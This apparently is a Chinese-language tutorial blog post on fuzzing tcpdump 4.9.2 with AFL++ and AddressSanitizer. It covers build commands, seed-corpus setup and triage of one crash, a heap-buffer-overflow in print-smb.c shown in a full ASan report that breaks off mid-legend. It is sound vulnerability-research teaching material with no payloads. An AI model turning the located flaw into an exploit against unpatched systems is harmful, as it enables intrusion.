<p>学习的目标：</p>
<ul>
<li>什么是 <strong>ASan (Address Sanitizer)</strong>，一个运行时内存错误检测工具</li>
<li>如何使用 ASAN 对目标进行模糊测试</li>
<li>使用 ASan 对崩溃进行分类有多容易</li>
</ul>
<h2 id="Do-it-yourself"><a href="#Do-it-yourself" class="headerlink" title="Do it yourself!"></a>Do it yourself!</h2><p>为了完成这个练习，你需要：</p>
<ul>
<li>找到一种对 TCPdump 进行模糊测试的有效方法</li>
<li>尝试弄清楚如何启用 ASan 进行模糊测试</li>
<li>Fuzz TCPdump，直到你有一些独特的崩溃</li>
<li>对崩溃进行分类以找到漏洞的 PoC</li>
<li>修复问题</li>
</ul>
<h2 id="Download-and-build-your-target"><a href="#Download-and-build-your-target" class="headerlink" title="Download and build your target"></a>Download and build your target</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME</span><br><span class="line">mkdir fuzzing_tcpdump &amp;&amp; cd fuzzing_tcpdump/</span><br><span class="line"></span><br><span class="line">cd ..</span><br><span class="line">wget https://github.com/the-tcpdump-group/tcpdump/archive/refs/tags/tcpdump-4.9.2.tar.gz # 下载tcpdump-4.9.2.tar.gz</span><br><span class="line">tar -xzvf tcpdump-4.9.2.tar.gz</span><br><span class="line"></span><br><span class="line">wget https://github.com/the-tcpdump-group/libpcap/archive/refs/tags/libpcap-1.8.0.tar.gz # 下载TCPdump需要的跨平台库libpcap</span><br><span class="line">tar -xzvf libpcap-1.8.0.tar.gz</span><br><span class="line"></span><br><span class="line">mv libpcap-libpcap-1.8.0/ libpcap-1.8.0 # 将libpcap-libpcap-1.8.0重命名为libpcap-1.8.0(否则tcpdump找不到libpcap.a本地路径)</span><br><span class="line"></span><br><span class="line">cd $HOME/libpcap-1.8.0/ # 构建和安装libpcap</span><br><span class="line">./configure --enable-shared=no</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line">cd $HOME/tcpdump-tcpdump-4.9.2/ # 构建和安装tcpdump</span><br><span class="line">./configure --prefix=&quot;$HOME/fuzzing_tcpdump/install2/&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<p>要测试一切是否正常，只需键入：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">HOME/fuzzing_tcpdump/install2/sbin/tcpdump -h</span></span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">tcpdump version <span class="number">4.9</span><span class="number">.2</span></span><br><span class="line">libpcap version <span class="number">1.8</span><span class="number">.0</span></span><br><span class="line">OpenSSL <span class="number">1.1</span><span class="number">.1f</span>  <span class="number">31</span> Mar <span class="number">2020</span></span><br><span class="line">Usage: tcpdump [-aAbdDefhHIJKlLnNOpqStuUvxX#] [ -B size ] [ -c count ]</span><br><span class="line">		[ -C file_size ] [ -E algo:secret ] [ -F file ] [ -G seconds ]</span><br><span class="line">		[ -i interface ] [ -j tstamptype ] [ -M secret ] [ --number ]</span><br><span class="line">		[ -Q in|out|inout ]</span><br><span class="line">		[ -r file ] [ -s snaplen ] [ --time-stamp-precision precision ]</span><br><span class="line">		[ --immediate-mode ] [ -T type ] [ --version ] [ -V file ]</span><br><span class="line">		[ -w file ] [ -W filecount ] [ -y datalinktype ] [ -z postrotate-command ]</span><br><span class="line">		[ -Z user ] [ expression ]</span><br></pre></td></tr></table></figure>
<h2 id="Seed-corpus-creation"><a href="#Seed-corpus-creation" class="headerlink" title="Seed corpus creation"></a>Seed corpus creation</h2><p>您可以在 tests 文件夹中找到很多 .pcap 示例。 您可以使用以下命令行运行这些 .pcap 文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">HOME/fuzzing_tcpdump/install/sbin/tcpdump -vvvvXX -ee -nn -r ./tests/geneve.pcap</span></span><br></pre></td></tr></table></figure>
<ul>
<li>pcap 文件是常用的数据报存储格式（拖入 wireshark 就可以直接查看），可以理解为就是一种文件格式，只不过里面的数据是按照特定格式存储的</li>
<li>所以我们想要解析里面的数据，也必须按照一定的格式，比如使用 wireshark 或者 tcpdump</li>
</ul>
<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">reading from file ./tests/geneve.pcap, link-<span class="function">type <span class="title">EN10MB</span> <span class="params">(Ethernet)</span></span></span><br><span class="line"><span class="function">06:04:33.817203 00:1b:21:3c:ab:64 &gt; 00:1b:21:3c:ac:30, ethertype <span class="title">IPv4</span> <span class="params">(<span class="number">0x0800</span>)</span>, length 156: <span class="params">(tos <span class="number">0x0</span>, ttl <span class="number">64</span>, id <span class="number">57261</span>, offset <span class="number">0</span>, flags [DF], proto UDP (<span class="number">17</span>), length <span class="number">142</span>)</span></span></span><br><span class="line"><span class="function">    20.0.0.1.12618 &gt; 20.0.0.2.6081: [no cksum] Geneve, Flags [C], vni 0xa, proto <span class="title">TEB</span> <span class="params">(<span class="number">0x6558</span>)</span>, options [class <span class="title">Standard</span> <span class="params">(<span class="number">0x0</span>)</span> type 0<span class="title">x80</span><span class="params">(C)</span> len 8 data 0000000c]</span></span><br><span class="line"><span class="function">	b6:9e:d2:49:51:48 &gt; fe:71:d8:83:72:4f, ethertype <span class="title">IPv4</span> <span class="params">(<span class="number">0x0800</span>)</span>, length 98: <span class="params">(tos <span class="number">0x0</span>, ttl <span class="number">64</span>, id <span class="number">48546</span>, offset <span class="number">0</span>, flags [DF], proto ICMP (<span class="number">1</span>), length <span class="number">84</span>)</span></span></span><br><span class="line"><span class="function">    30.0.0.1 &gt; 30.0.0.2: ICMP echo request, id 10578, seq 23, length 64</span></span><br><span class="line"><span class="function">	0x0000:  001b 213c ac30 001b 213c ab64 0800 4500  ..!&lt;.0..!&lt;.d..E.</span></span><br><span class="line"><span class="function">	0x0010:  008e dfad 4000 4011 32af 1400 0001 1400  ....@.@.2.......</span></span><br><span class="line"><span class="function">	0x0020:  0002 314a 17c1 007a 0000 0240 6558 0000  ..1J...z...@eX..</span></span><br><span class="line"><span class="function">	0x0030:  0a00 0000 8001 0000 000c fe71 d883 724f  ...........q..rO</span></span><br><span class="line"><span class="function">	0x0040:  b69e d249 5148 0800 4500 0054 bda2 4000  ...IQH..E..T..@.</span></span><br><span class="line"><span class="function">	0x0050:  4001 4104 1e00 0001 1e00 0002 0800 2c54  @.A...........,T</span></span><br><span class="line"><span class="function">	0x0060:  2952 0017 f1a2 ce54 0000 0000 1778 0c00  )R.....T.....x..</span></span><br><span class="line"><span class="function">	0x0070:  0000 0000 1011 1213 1415 1617 1819 1a1b  ................</span></span><br><span class="line"><span class="function">	0x0080:  1c1d 1e1f 2021 2223 2425 2627 2829 2a2b  .....!&quot;#$%&amp;&#x27;<span class="params">()</span>*+</span></span><br><span class="line"><span class="function">	0x0090:  2c2d 2e2f 3031 3233 3435 3637            ,-./01234567</span></span><br><span class="line"><span class="function">06:04:33.817454 00:1b:21:3c:ac:30 &gt; 00:1b:21:3c:ab:64, ethertype <span class="title">IPv4</span> <span class="params">(<span class="number">0x0800</span>)</span>, length 148: <span class="params">(tos <span class="number">0x0</span>, ttl <span class="number">64</span>, id <span class="number">34821</span>, offset <span class="number">0</span>, flags [DF], proto UDP (<span class="number">17</span>), length <span class="number">134</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">......</span></span><br></pre></td></tr></table></figure>
<ul>
<li>和 wireshark 显示的结果大同小异</li>
</ul>
<h2 id="AddressSanitizer"><a href="#AddressSanitizer" class="headerlink" title="AddressSanitizer"></a>AddressSanitizer</h2><p><strong>AddressSanitizer (ASan)</strong> 是用于 C 和 C++ 的快速内存错误检测器</p>
<ul>
<li>它最初由 Google（Konstantin Serebryany、Derek Bruening、Alexander Potapenko、Dmitry Vyukov）开发，并于 2011 年 5 月首次发布</li>
<li>它由一个编译器检测模块和一个运行时库组成，该工具能够发现对堆、堆栈和全局对象的越界访问，以及释放后使用、双重释放和内存泄漏错误</li>
<li>AddressSanitizer 是开源的，从 3.1 版开始与 LLVM 编译器工具链集成，虽然它最初是作为 LLVM 项目开发的，但它已被移植到 GCC 并包含在 &gt;= 4.8 的 GCC 版本中</li>
</ul>
<p>现在我们将构建启用 ASAN 的 tcpdump（和 libpcap），首先，我们要清理所有以前编译的目标文件和可执行文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME/libpcap-1.8.0/</span><br><span class="line">make clean</span><br><span class="line"></span><br><span class="line">cd $HOME/tcpdump-tcpdump-4.9.2/</span><br><span class="line">make clean</span><br></pre></td></tr></table></figure>
<p>现在，我们在调用“configure”和“make”之前设置“AFL_USE_ASAN=1”：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME/libpcap-1.8.0/</span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">CC=afl-clang-lto ./configure --enable-shared=no --prefix=&quot;$HOME/fuzzing_tcpdump/install/&quot;</span><br><span class="line">AFL_USE_ASAN=1 make</span><br><span class="line">AFL_USE_ASAN=1 make install</span><br><span class="line"></span><br><span class="line">cd $HOME/tcpdump-tcpdump-4.9.2/</span><br><span class="line">AFL_USE_ASAN=1 CC=afl-clang-lto ./configure --prefix=&quot;$HOME/fuzzing_tcpdump/install/&quot;</span><br><span class="line">AFL_USE_ASAN=1 make</span><br><span class="line">AFL_USE_ASAN=1 make install</span><br></pre></td></tr></table></figure>
<h2 id="Fuzz-TCPdump"><a href="#Fuzz-TCPdump" class="headerlink" title="Fuzz TCPdump"></a>Fuzz TCPdump</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -m none -i $HOME/tcpdump-tcpdump-4.9.2/tests/ -o $HOME/fuzzing_tcpdump/out/ -s 123 -- $HOME/fuzzing_tcpdump/install/sbin/tcpdump -vvvvXX -ee -nn -r @@</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：64 位系统上的 ASAN 需要大量虚拟内存，需要设置了标志 “-m none” 来禁用 AFL 中的内存限制</li>
</ul>
<img src="/2022/08/16/Fuzz%20Lab3-TCPdump/1660639958590.png" class width="1660639958590"> 
<ul>
<li>PS：4小时，太慢了~~</li>
</ul>
<h2 id="Triage"><a href="#Triage" class="headerlink" title="Triage"></a>Triage</h2><p>调试使用 ASan 构建的程序比前面的练习要容易得多，您需要做的就是向程序提供崩溃文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">HOME/fuzzing_tcpdump/install/sbin/tcpdump -vvvvXX -ee -nn -r ./id:000000,sig:06,src:005014,time:6037115,execs:4952858,op:havoc,rep:16</span></span><br></pre></td></tr></table></figure>
<p>结果如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">Warning: AFL++ tools might need to <span class="built_in">set</span> AFL_MAP_SIZE to <span class="number">84065</span> to be able to run <span class="keyword">this</span> instrumented program <span class="keyword">if</span> <span class="keyword">this</span> crashes!</span><br><span class="line">reading from file ./id:<span class="number">000000</span>,sig:<span class="number">06</span>,src:<span class="number">005014</span>,time:<span class="number">6037115</span>,execs:<span class="number">4952858</span>,op:havoc,rep:<span class="number">16</span>, link-<span class="function">type <span class="title">EN10MB</span> <span class="params">(Ethernet)</span></span></span><br><span class="line"><span class="function">04:27:12.000006 01:01:01:0d:01:01 &gt; ed:e9:ff:ff:ff:ff, ethertype <span class="title">IPv4</span> <span class="params">(<span class="number">0x0800</span>)</span>, length 67: truncated-ip - 2607 bytes missing! <span class="params">(tos <span class="number">0xe5</span>,ECT(<span class="number">1</span>), ttl <span class="number">252</span>, id <span class="number">8264</span>, offset <span class="number">0</span>, flags [none], proto UDP (<span class="number">17</span>), length <span class="number">2660</span>, bad cksum <span class="number">121</span> (-&gt;d6d1)!)</span></span></span><br><span class="line"><span class="function">    222.241.104.198.53 &gt; 131.63.241.146.67: 212 op8 ServFail|$ [41218q] q: <span class="title">Type212</span> <span class="params">(Class <span class="number">50098</span>)</span>? ., q:[|domain]</span></span><br><span class="line"><span class="function">	0x0000:  ede9 ffff ffff 0101 010d 0101 0800 45e5  ..............E.</span></span><br><span class="line"><span class="function">	0x0010:  0a64 2048 0000 fc11 0121 def1 68c6 833f  .d.H.....!..h..?</span></span><br><span class="line"><span class="function">	0x0020:  f192 0035 0043 1800 5002 00d4 c3b2 a102  ...5.C..P.......</span></span><br><span class="line"><span class="function">	0x0030:  0004 0000 0000 0000 d4c3 b2a1 0200 0400  ................</span></span><br><span class="line"><span class="function">	0x0040:  0000 0001 0000 0000 5d00 0000            ........]...</span></span><br><span class="line"><span class="function">08:01:59.1399853056 59:59:d4:c3:b2:a1 &gt; 00:00:00:00:00:71, 802.3, length 512: LLC, dsap <span class="title">SNA</span> <span class="params">(<span class="number">0x04</span>)</span> Individual, ssap <span class="title">Null</span> <span class="params">(<span class="number">0x00</span>)</span> Command, ctrl 0x0000: Information, send seq 0, rcv seq 0, Flags [Command], length 587271413</span></span><br><span class="line"><span class="function">	0x0000:  0000 0000 0071 5959 d4c3 b2a1 0200 0400  .....qYY........</span></span><br><span class="line"><span class="function">	0x0010:  0000 0000 0000 0000 ffff 0000 0100 0000  ................</span></span><br><span class="line"><span class="function">23:17:28.958610 00:04:23:57:a5:7a &gt; ff:ff:ff:ff:ef:ff, ethertype <span class="title">IPv4</span> <span class="params">(<span class="number">0x0800</span>)</span>, length 221: <span class="params">(tos <span class="number">0x0</span>, ttl <span class="number">128</span>, id <span class="number">14471</span>, offset <span class="number">0</span>, flags [none], proto UDP (<span class="number">17</span>), length <span class="number">207</span>)</span></span></span><br><span class="line"><span class="function">    192.168.1.249.138 &gt; 192.168.1.255.138: </span></span><br><span class="line"><span class="function">&gt;&gt;&gt; NBT UDP <span class="title">PACKET</span><span class="params">(<span class="number">138</span>)</span> Res</span>=<span class="number">0x110E</span> ID=<span class="number">0x891D</span> IP=<span class="number">192</span> (<span class="number">0xc0</span>)<span class="number">.168</span> (<span class="number">0xa8</span>)<span class="number">.1</span> (<span class="number">0x1</span>)<span class="number">.249</span> (<span class="number">0xf9</span>) Port=<span class="number">650</span> (<span class="number">0x28a</span>) Length=<span class="number">165</span> (<span class="number">0xa5</span>) Res2=<span class="number">0x0</span></span><br><span class="line">SourceName=DJP95S0J        NameType=<span class="number">0x00</span> (Workstation)</span><br><span class="line">DestName=ARBEITSGRUPPE   NameType=<span class="number">0x00</span> (Workstation)</span><br><span class="line"></span><br><span class="line">SMB PACKET: SMBtrans (REQUEST)</span><br><span class="line">SMB Command   =  <span class="number">0x25</span></span><br><span class="line">Error class   =  <span class="number">0x0</span></span><br><span class="line">Error code    =  <span class="number">0</span> (<span class="number">0x0</span>)</span><br><span class="line">Flags1        =  <span class="number">0x0</span></span><br><span class="line">Flags2        =  <span class="number">0x0</span></span><br><span class="line">Tree ID       =  <span class="number">0</span> (<span class="number">0x0</span>)</span><br><span class="line">Proc ID       =  <span class="number">0</span> (<span class="number">0x0</span>)</span><br><span class="line">UID           =  <span class="number">0</span> (<span class="number">0x0</span>)</span><br><span class="line">MID           =  <span class="number">0</span> (<span class="number">0x0</span>)</span><br><span class="line">Word Count    =  <span class="number">17</span> (<span class="number">0x11</span>)</span><br><span class="line">TotParamCnt=<span class="number">0</span> (<span class="number">0x0</span>) </span><br><span class="line">TotDataCnt=<span class="number">11</span> (<span class="number">0xb</span>) </span><br><span class="line">MaxParmCnt=<span class="number">0</span> (<span class="number">0x0</span>) </span><br><span class="line">MaxDataCnt=<span class="number">0</span> (<span class="number">0x0</span>)</span><br><span class="line">MaxSCnt=<span class="number">0</span> (<span class="number">0x0</span>) </span><br><span class="line">TransFlags=<span class="number">0x0</span> </span><br><span class="line">Res1=<span class="number">0x3E9</span> </span><br><span class="line">Res2=<span class="number">0x0</span> </span><br><span class="line">Res3=<span class="number">0x0</span></span><br><span class="line">ParamCnt=<span class="number">0</span> (<span class="number">0x0</span>) </span><br><span class="line">ParamOff=<span class="number">0</span> (<span class="number">0x0</span>) </span><br><span class="line">DataCnt=<span class="number">11</span> (<span class="number">0xb</span>) </span><br><span class="line">DataOff=<span class="number">86</span> (<span class="number">0x56</span>) </span><br><span class="line">SUCnt=<span class="number">3</span> (<span class="number">0x3</span>)</span><br><span class="line">Data: (<span class="number">6</span> bytes)</span><br><span class="line">[<span class="number">000</span>] <span class="number">01</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span>                                 \<span class="number">0x01</span>\<span class="number">0x00</span>\<span class="number">0x01</span>\<span class="number">0x00</span>\<span class="number">0x02</span>\<span class="number">0x00</span> </span><br><span class="line">smb_bcc=<span class="number">28</span></span><br><span class="line">=================================================================</span><br><span class="line">==<span class="number">2727</span>==ERROR: AddressSanitizer: heap-buffer-overflow on address <span class="number">0x611000000107</span> at pc <span class="number">0x0000003d0235</span> bp <span class="number">0x7ffc22dc8210</span> sp <span class="number">0x7ffc22dc79b8</span> <span class="comment">/* 对应代码的位置 */</span></span><br><span class="line">READ of size <span class="number">7</span> at <span class="number">0x611000000107</span> thread T0 <span class="comment">/* heap中的溢出点 */</span></span><br><span class="line">    #<span class="number">0</span> <span class="number">0x3d0234</span> in <span class="built_in">strcmp</span> (/home/yhellow/fuzzing_tcpdump/install/sbin/tcpdump+<span class="number">0x3d0234</span>)</span><br><span class="line">    #<span class="number">1</span> <span class="number">0x712469</span> in print_trans /home/yhellow/tcpdump-tcpdump<span class="number">-4.9</span><span class="number">.2</span>/./print-smb.c:<span class="number">375</span>:<span class="number">6</span></span><br><span class="line">    #<span class="number">2</span> <span class="number">0x713f6a</span> in print_smb /home/yhellow/tcpdump-tcpdump<span class="number">-4.9</span><span class="number">.2</span>/./print-smb.c:<span class="number">863</span>:<span class="number">6</span></span><br><span class="line">    #<span class="number">3</span> <span class="number">0x6ec5e1</span> in nbt_udp138_print /home/yhellow/tcpdump-tcpdump<span class="number">-4.9</span><span class="number">.2</span>/./print-smb.c:<span class="number">1307</span>:<span class="number">6</span></span><br><span class="line">    #<span class="number">4</span> <span class="number">0x6ec5e1</span> in udp_print /home/yhellow/tcpdump-tcpdump<span class="number">-4.9</span><span class="number">.2</span>/./print-udp.c:<span class="number">608</span>:<span class="number">4</span></span><br><span class="line">    #<span class="number">5</span> <span class="number">0x55dfe8</span> in ip_print_demux /home/yhellow/tcpdump-tcpdump<span class="number">-4.9</span><span class="number">.2</span>/./print-ip.c:<span class="number">402</span>:<span class="number">3</span></span><br><span class="line">    #<span class="number">6</span> <span class="number">0x5616e5</span> in ip_print /home/yhellow/tcpdump-tcpdump<span class="number">-4.9</span><span class="number">.2</span>/./print-ip.c:<span class="number">673</span>:<span class="number">3</span></span><br><span class="line">    #<span class="number">7</span> <span class="number">0x51ac27</span> in ethertype_print /home/yhellow/tcpdump-tcpdump<span class="number">-4.9</span><span class="number">.2</span>/./print-ether.c:<span class="number">333</span>:<span class="number">10</span></span><br><span class="line">    #<span class="number">8</span> <span class="number">0x51996a</span> in ether_print /home/yhellow/tcpdump-tcpdump<span class="number">-4.9</span><span class="number">.2</span>/./print-ether.c:<span class="number">236</span>:<span class="number">7</span></span><br><span class="line">    #<span class="number">9</span> <span class="number">0x4791ab</span> in pretty_print_packet /home/yhellow/tcpdump-tcpdump<span class="number">-4.9</span><span class="number">.2</span>/./print.c:<span class="number">332</span>:<span class="number">18</span></span><br><span class="line">    #<span class="number">10</span> <span class="number">0x4791ab</span> in print_packet /home/yhellow/tcpdump-tcpdump<span class="number">-4.9</span><span class="number">.2</span>/./tcpdump.c:<span class="number">2497</span>:<span class="number">2</span></span><br><span class="line">    #<span class="number">11</span> <span class="number">0x83da5d</span> in pcap_offline_read /home/yhellow/libpcap<span class="number">-1.8</span><span class="number">.0</span>/./savefile.c:<span class="number">507</span>:<span class="number">4</span></span><br><span class="line">    #<span class="number">12</span> <span class="number">0x470c0c</span> in pcap_loop /home/yhellow/libpcap<span class="number">-1.8</span><span class="number">.0</span>/./pcap.c:<span class="number">875</span>:<span class="number">8</span></span><br><span class="line">    #<span class="number">13</span> <span class="number">0x470c0c</span> in main /home/yhellow/tcpdump-tcpdump<span class="number">-4.9</span><span class="number">.2</span>/./tcpdump.c:<span class="number">2000</span>:<span class="number">12</span></span><br><span class="line">    #<span class="number">14</span> <span class="number">0x7fa3263bb082</span> in __libc_start_main /build/glibc-SzIz7B/glibc<span class="number">-2.31</span>/csu/../csu/libc-start.c:<span class="number">308</span>:<span class="number">16</span></span><br><span class="line">    #<span class="number">15</span> <span class="number">0x3bcedd</span> in _start (/home/yhellow/fuzzing_tcpdump/install/sbin/tcpdump+<span class="number">0x3bcedd</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">0x611000000107</span> is located <span class="number">0</span> bytes to the right of <span class="number">199</span>-byte region [<span class="number">0x611000000040</span>,<span class="number">0x611000000107</span>)</span><br><span class="line">allocated by thread T0 here:</span><br><span class="line">    #<span class="number">0</span> <span class="number">0x436f4d</span> in <span class="built_in">malloc</span> (/home/yhellow/fuzzing_tcpdump/install/sbin/tcpdump+<span class="number">0x436f4d</span>)</span><br><span class="line">    #<span class="number">1</span> <span class="number">0x83efd8</span> in pcap_check_header /home/yhellow/libpcap<span class="number">-1.8</span><span class="number">.0</span>/./sf-pcap.c:<span class="number">401</span>:<span class="number">14</span></span><br><span class="line">    #<span class="number">2</span> <span class="number">0x83ce1d</span> in pcap_fopen_offline_with_tstamp_precision /home/yhellow/libpcap<span class="number">-1.8</span><span class="number">.0</span>/./savefile.c:<span class="number">380</span>:<span class="number">7</span></span><br><span class="line">    #<span class="number">3</span> <span class="number">0x83cb48</span> in pcap_open_offline_with_tstamp_precision /home/yhellow/libpcap<span class="number">-1.8</span><span class="number">.0</span>/./savefile.c:<span class="number">287</span>:<span class="number">6</span></span><br><span class="line"></span><br><span class="line">SUMMARY: AddressSanitizer: heap-buffer-overflow (/home/yhellow/fuzzing_tcpdump/install/sbin/tcpdump+<span class="number">0x3d0234</span>) in <span class="built_in">strcmp</span></span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  <span class="number">0x0c227fff7fd0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0c227fff7fe0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0c227fff7ff0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0c227fff8000</span>: fa fa fa fa fa fa fa fa <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0c227fff8010</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">=&gt;<span class="number">0x0c227fff8020</span>:[<span class="number">07</span>]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c227fff8030</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c227fff8040</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c227fff8050</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c227fff8060</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c227fff8070</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">Shadow byte legend (one shadow byte represents <span class="number">8</span> application bytes):</span><br><span class="line">  Addressable:           <span class="number">00</span></span><br><span class="line">  Partially addressable: <span class="number">01</span> <span class="number">02</span> <span class="number">03</span> <span class="number">04</span> <span class="number">05</span> <span class="number">06</span> <span class="number">07</span> </span><br><span class="line">  Heap left redzone:       fa</span><br><span class="line">  Freed heap region:       fd</span><br><span class="line">  Stack left redzone:      f1</span><br><span class="line">  Stack mid redzone:       f2</span><br><span class="line">  Stack right redzone:     f3</span><br><span class="line">  Stack after <span class="keyword">return</span>:      f5</span><br><span class="line">  Stack use after scope:   f8</span><br><span class="line">  Global redzone:          f9</span><br><span class="line">  Global init order:       f6</span><br><span class="line">  Poisoned by user:        f7</span><br><span class="line">  Container overflow:      fc</span><br><span class="line">  Array cookie:            ac</span><br><span class="line">  Intra object redzone:    bb</span><br><span class="line">  ASan internal:           fe</span><br><span class="line">  Left alloca redzone:     ca</span><br><span class="line">  Right alloca 